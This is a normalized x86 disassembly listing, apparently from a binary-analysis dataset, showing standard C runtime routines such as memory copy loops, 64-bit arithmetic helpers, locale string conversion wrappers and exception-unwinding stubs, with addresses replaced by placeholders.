mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_41564c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4154b0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4154b0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4154b0 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_41564c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_41564c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_41564c ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_4156b0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_4156f0
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_415785
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x18 ]
push ebx
xor ebx ebx
push esi
push edi
cmp edx ebx
jle r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx edx
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x28 ] ebx
push ebx
push ebx
push [ ebp + 0x18 ]
setne al
push [ ebp + 0x14 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x24 ]
call esi
mov edi eax
mov [ ebp - 0x10 ] edi
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov eax edx
sub eax ecx
dec eax
cmp eax edx
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x18 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x1c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_401400
leave
retn
push edi
push [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x24 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp - 0xc ]
call sub_40d03f
mov eax [ ebp - 0x8 ]
pop ecx
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
push eax
call sub_40381b
pop ecx
cmp eax ebx
je r-xdata
call sub_413d10
mov eax esp
cmp eax ebx
je r-xdata
mov ecx 0x400
test [ ebp + 0x10 ] ecx
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
mov edi [ ebp - 0x8 ]
cmp edi ebx
jle r-xdata
mov eax [ ebp + 0x20 ]
cmp eax ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x8 ] eax
jg r-xdata
push [ ebp - 0x8 ]
push edi
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax ecx
ja r-xdata
push eax
push [ ebp + 0x1c ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
jmp r-xdata
push edi
call sub_40d03f
pop ecx
push ebx
push ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
push eax
call sub_40381b
pop ecx
cmp eax ebx
je r-xdata
call sub_413d10
mov edi esp
cmp edi ebx
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
push ebx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push edi
push ebx
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp edi ebx
je r-xdata
sub_41596c
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x1c ]
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
jle r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_401400
leave
retn
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_413e10
add esp 0xc
push edi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_40d03f
mov eax [ ebp - 0x8 ]
pop ecx
push [ ebp + 0x18 ]
push eax
push ebx
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_40381b
pop ecx
cmp eax ebx
je r-xdata
call sub_413d10
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_415a60
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_415ab0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_415af0
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415b10
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_401400
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_415b55
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_415b55
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_415b10
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_415c05
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_415c24
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_415bfc
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_415c05
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_415c30
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_415c60
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_415d40
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_415d5f
push 0x14
push r--data
call sub_413ff0
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_40723f
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_415e30
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_414035
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_40b20f
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_415e01
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_40cab2
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_40cab2
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_415e39
xor eax eax
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
inc eax
test bl 0x4
je r-xdata
or eax 0x4
test bl 0x2
je r-xdata
or eax 0x8
test bl 0x1
je r-xdata
or eax 0x10
test ebx 0x80000
je r-xdata
or eax 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
push esi
mov esi 0x200
je r-xdata
or eax 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or eax 0x400
cmp ecx esi
je r-xdata
retn
or eax 0x1000
pop esi
test ebx 0x40000
je r-xdata
or eax esi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp ecx edx
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_415ec7
xor eax eax
test dl 0x10
je r-xdata
push ebx
push esi
push edi
mov ebx 0x200
test dl 0x8
je r-xdata
mov eax 0x80
test dl 0x4
je r-xdata
or eax ebx
test dl 0x2
je r-xdata
or eax 0x400
test dl 0x1
je r-xdata
or eax 0x800
mov edi 0x100
test edx 0x80000
je r-xdata
or eax 0x1000
mov ecx edx
mov esi 0x300
and ecx esi
je r-xdata
or eax edi
mov ecx 0x3000000
pop edi
and edx ecx
pop esi
pop ebx
cmp edx 0x1000000
je r-xdata
cmp ecx edi
je r-xdata
or eax 0x8040
cmp edx 0x2000000
je r-xdata
or eax 0x2000
cmp ecx ebx
je r-xdata
or eax 0x40
retn
cmp edx ecx
jne r-xdata
or eax 0x4000
jmp r-xdata
cmp ecx esi
jne r-xdata
retn
or eax 0x8000
retn
or eax 0x6000
jmp r-xdata
sub_415f70
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_4013e2
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
retn
push [ esi + 0x4 ]
call sub_40ab76
pop ecx
sub_401490
mov eax [ eax ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_4016c5
push [ ebp + 0x8 ]
call sub_40417b
pop ecx
retn
sub_401990
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_409fc3
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_401b65
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_401c00
push [ rw-data ]
call [ DecodePointer@IAT ]
retn
sub_401d30
mov [ ecx ] r--data
retn
sub_401da3
push esi
call sub_40a039
pop ecx
retn
sub_401fea
xor eax eax
inc eax
retn
sub_401fee
mov esp [ ebp - 0x18 ]
call sub_407805
sub_402100
mov ecx [ ebp - 0x14 ]
push ecx
call sub_408b16
add esp 0x4
push 0x0
push 0x0
call sub_4037cf
int3
sub_40235e
push 0xc
call sub_41334d
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_4023b6
push 0x8
call sub_41334d
pop ecx
retn
sub_40243d
push [ ebp - 0x14 ]
call sub_4017b3
pop ecx
retn
sub_402481
call sub_40c968
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_40c968
dec [ eax + 0x90 ]
sub_40252c
push 0x1
call sub_415d5f
pop ecx
retn
sub_4027c3
push ebx
call sub_40417b
pop ecx
retn
sub_4029bd
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_41334d
pop ecx
sub_4036dd
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_403728
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_4037b2
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40d6bc
add esp 0x14
pop ebp
retn
sub_40399d
push ebx
call sub_40417b
pop ecx
retn
sub_403b06
push 0xd
call sub_41334d
pop ecx
retn
sub_403b3f
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_4130db
add esp 0xc
pop ebp
retn
sub_403bff
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_4039a5
pop ecx
mov [ rw-data ] 0x1
sub_403da0
push ecx
call [ VariantClear@IAT ]
retn
sub_403db0
push ebp
mov ebp esp
mov eax [ ecx + 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ecx + 0x10 ]
pop ebp
retn 0x4
sub_404050
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x31 ] 0x0
jne r-xdata
retn
lea esp [ esp ]
mov eax ecx
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x31 ] 0x0
je r-xdata
sub_4043f3
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_402af2
add esp 0x10
pop ebp
retn
sub_40440d
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileW@IAT ]
mov [ rw-data ] eax
retn
sub_4045dd
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_4045f4
push 0xa
call [ IsProcessorFeaturePresent@IAT ]
mov [ rw-data ] eax
xor eax eax
retn
sub_404ac1
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_4135a8
add esp 0xc
pop ebp
retn
sub_404d81
call sub_40c968
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_407805
call eax
sub_405749
call sub_40252c
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_40ab76
pop ecx
retn
call sub_41033d
sub_405eb0
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
retn
lea esp [ esp ]
mov eax ecx
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
sub_405ed0
push ebp
mov ebp esp
mov eax [ ecx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ecx + 0x4 ]
pop ebp
retn 0x4
sub_4068e2
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_409fc3
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_406900
push ebp
mov ebp esp
pop ebp
jmp sub_40381b
sub_407140
mov [ ecx ] r--data
jmp sub_41113d
sub_407272
push 0x0
push 0x1000
push 0x0
call [ HeapCreate@IAT ]
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
retn
sub_4077e0
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
retn
mov eax [ esi ]
push eax
call sub_408b16
add esp 0x4
sub_407805
push 0x8
push r--data
call sub_413ff0
call sub_40c968
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_40f3eb
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_407825
xor eax eax
inc eax
retn
sub_40783e
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40b11e
add esp 0x14
pop ebp
retn
sub_407c00
retn
sub_4088b9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_408981
push 0xa
call sub_41334d
pop ecx
retn
sub_4089f0
push ebp
mov ebp esp
mov eax [ ecx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ecx + 0x14 ]
pop ebp
retn 0x4
sub_408a10
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
retn
mov eax [ esi ]
push eax
call sub_408b16
add esp 0x4
sub_408c7c
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_408c85
mov esp [ ebp - 0x18 ]
call sub_407805
sub_40a455
push ebx
call sub_40417b
pop ecx
retn
sub_40a4cc
mov edi edi
push ebp
mov ebp esp
call sub_413229
cmp [ ebp + 0x8 ] 0x0
je r-xdata
fnclex
pop ebp
retn
call sub_40154d
sub_40a628
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_40dda0
pop ecx
pop ecx
pop ebp
retn
sub_40a821
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_40ab60
mov eax [ ebp - 0x14 ]
push eax
call sub_408b16
add esp 0x4
push 0x0
push 0x0
call sub_4037cf
int3
sub_40abd0
push 0x1
push 0x1
push 0x0
call sub_4135a8
add esp 0xc
retn
sub_40b052
push 0xd
call sub_41334d
pop ecx
retn
sub_40b05b
push 0xc
call sub_41334d
pop ecx
retn
sub_40b064
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_40a2a6
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_40b3ac
xor eax eax
inc eax
retn
sub_40b3b0
mov esp [ ebp - 0x18 ]
call sub_407805
sub_40b410
push ebp
mov ebp esp
pop ebp
jmp sub_40ab76
sub_40b4c5
push 0x8
call sub_40723f
pop ecx
retn
sub_40b626
mov edi edi
push ebp
mov ebp esp
